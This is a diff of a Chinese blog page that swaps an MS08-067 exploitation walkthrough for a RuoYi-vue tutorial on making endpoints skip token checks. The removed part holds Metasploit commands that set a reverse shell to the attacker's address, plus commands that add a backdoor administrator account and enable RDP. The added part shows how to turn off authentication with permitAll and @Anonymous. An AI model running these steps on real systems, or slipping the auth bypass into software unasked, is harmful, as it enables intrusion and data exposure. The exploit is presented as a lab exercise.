@@ -3,7 +3,7 @@
 <html lang="en">
 <head>
     <meta charset="utf-8" />
-    <title>MS08-067漏洞利用 | XccitのBlog</title>
+    <title>ruoyi-vue如何不验证Token访问接口 | XccitのBlog</title>
     <meta name="author" content="CH_ywx" />
     <meta name="description" content="贩卖温柔のselling kindness" />
     <meta name="keywords" content="" />
@@ -156,14 +156,14 @@
         <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
             <div class="article">
     <div>
-        <h1>MS08-067漏洞利用</h1>
+        <h1>ruoyi-vue如何不验证Token访问接口</h1>
     </div>
     <div class="info">
         <span class="date">
             <span class="icon">
                 <i class="fa-solid fa-calendar fa-fw"></i>
             </span>
-            2024/7/12
+            2024/7/21
         </span>
         
         
@@ -175,8 +175,8 @@
             
             <span class="tag">
                 
-                <a href="/tags/%E4%BF%A1%E5%AE%89/" style="color: #ffa2c4">
-                    信安
+                <a href="/tags/%E8%8B%A5%E4%BE%9D%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/" style="color: #00bcd4">
+                    若依二次开发
                 </a>
             </span>
             
@@ -185,35 +185,37 @@
     </div>
     
     <div class="content" v-pre>
-        <h1 id="MS08-067漏洞利用"><a href="#MS08-067漏洞利用" class="headerlink" title="MS08-067漏洞利用"></a>MS08-067漏洞利用</h1><p>目标机器:192.168.1.7 Windows XP</p>
-<p>攻击机:192.168.1.12 Kali</p>
-<h2 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h2><pre><code class="nmap">nmap -O -T4 -p445 -sV --script smb-vuln-ms08-067 192.168.1.7
+        <h1 id="Ruoyi-vue如何不验证Token访问接口"><a href="#Ruoyi-vue如何不验证Token访问接口" class="headerlink" title="Ruoyi-vue如何不验证Token访问接口"></a>Ruoyi-vue如何不验证Token访问接口</h1><blockquote>
+<p>若依前后端分离项目中,默认使用代码生成的接口是需要验证Token才能调用的,自己编写的接口如果没有经过配置,也需要验证Token,如果需要跳过Token验证直接访问,我们该怎么做呢?</p>
+</blockquote>
+<h2 id="1-配置匿名访问"><a href="#1-配置匿名访问" class="headerlink" title="1.配置匿名访问"></a>1.配置匿名访问</h2><p>在<code>ruoyi-framework</code>模块下<code>SecurityConfig</code>类中的<code>configure</code>方法中添加匿名访问配置:</p>
+<pre><code class="java">.antMatchers(&quot;/路径/**&quot;).permitAll()
 </code></pre>
-<p><img src="https://fastly.jsdelivr.net/gh/xccit/xccit.github.io/images_resource/image-20210408140441521.png" alt="image-20210408140441521"></p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><pre><code class="nmap">service postgresql start
-msfconsole
-search 08-067
-use exploit/windows/smb/ms08_067_netapi
-show options
-set rhosts 192.168.1.7
-set payload windows/shell/reverse_tcp
-set lhost 192.168.1.12
-exploit
+<p>例如:</p>
+<pre><code class="java">.antMatchers(&quot;/user/**&quot;).permitAll()
 </code></pre>
-<p><img src="https://fastly.jsdelivr.net/gh/xccit/xccit.github.io/images_resource/image-20210408140542782.png" alt="image-20210408140542782"></p>
-<p><img src="https://fastly.jsdelivr.net/gh/xccit/xccit.github.io/images_resource/image-20210408141354688.png" alt="image-20210408141354688"></p>
-<p><strong>exploit</strong>命令执行后就成功利用漏洞进入了windows系统</p>
-<p><img src="https://fastly.jsdelivr.net/gh/xccit/xccit.github.io/images_resource/image-20210408141816252.png" alt="image-20210408141816252"></p>
-<p>进入windows系统后执行以下命令，新建用户方便进入winows系统</p>
-<pre><code class="shell">net user hacker 123456 /add      hacker:用户名 123456:密码
-net localhost administrators hacker /add  hacker:用户名    --将hacker用户添加至管理员组
-REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f  开启3389端口
+<h2 id="2-添加-Anonymous-注解"><a href="#2-添加-Anonymous-注解" class="headerlink" title="2.添加*@Anonymous*注解"></a>2.添加*@Anonymous*注解</h2><pre><code class="java">/*类上定义匿名注解，作用于所有的方法*/
+@Anonymous
+@RestController
+@RequestMapping(&quot;/user&quot;)
+public class UserController extends BaseController
+&#123;
+
+&#125;
 </code></pre>
-<p>而后kali新打开一个shell窗口，输入以下命令进行远控登录:</p>
-<pre><code class="shell">rdesktop 192.168.1.7
+<pre><code class="java">/*方法定义匿名注解，作用于单独的方法*/
+@Anonymous
+@GetMapping(&quot;/list&quot;)
+public List&lt;User&gt; list(User user)
+&#123;
+    List&lt;User&gt; userList = userService.selectList(user);
+    return AjaxResult.success(userList);
+&#125;
 </code></pre>
-<p><img src="https://fastly.jsdelivr.net/gh/xccit/xccit.github.io/images_resource/image-20210408142450690.png" alt="image-20210408142450690"></p>
-<p><img src="https://fastly.jsdelivr.net/gh/xccit/xccit.github.io/images_resource/image-20210408142515324.png" alt="image-20210408142515324"></p>
+<blockquote>
+<p>匿名访问的方法上面<code>@PreAuthorize</code>权限注解也需要去掉，因为已经使用匿名访问了，权限自然也不需要去验证了。</p>
+</blockquote>
+<p>最后重启项目即可跳过Token访问接口</p>
 
     </div>
     
